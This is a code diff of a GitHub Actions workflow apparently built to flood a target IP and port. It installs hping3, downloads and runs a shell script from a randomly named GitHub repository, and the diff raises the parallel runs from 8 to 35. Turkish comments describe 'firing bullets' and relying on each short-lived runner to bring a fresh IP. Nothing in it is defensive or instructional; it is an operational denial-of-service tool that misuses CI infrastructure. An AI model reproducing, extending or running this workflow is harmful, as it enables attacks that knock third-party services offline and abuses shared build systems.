@@ -9,9 +9,6 @@ on:
       port:
         description: "Target Port"
         required: true
-      time:
-        description: "Duration"
-        required: true
 
 jobs:
   blitz:
@@ -26,15 +23,15 @@ jobs:
     steps:
       - name: Prep
         run: |
-          apt install hping3
-          wget https://github.com/qwesdaasdasd/asdsdawa4234rdsf/raw/refs/heads/main/real2.sh -O real.sh
-          chmod +x real.sh
+          sudo apt install hping3
+          wget https://github.com/qwesdaasdasd/asdsdawa4234rdsf/raw/refs/heads/main/real2.sh -O real2.sh
+          chmod +x real2.sh
 
       - name: Burst Attack
         run: |
           # 10 saniye boyunca 8 koldan mermi basıyoruz
-          for i in {1..8}; do
-             sudo timeout 60 bash real.sh ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.time }} &
+          for i in {1..35}; do
+             sudo timeout 60 bash real2.sh ${{ inputs.ip }} ${{ inputs.port }}  &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
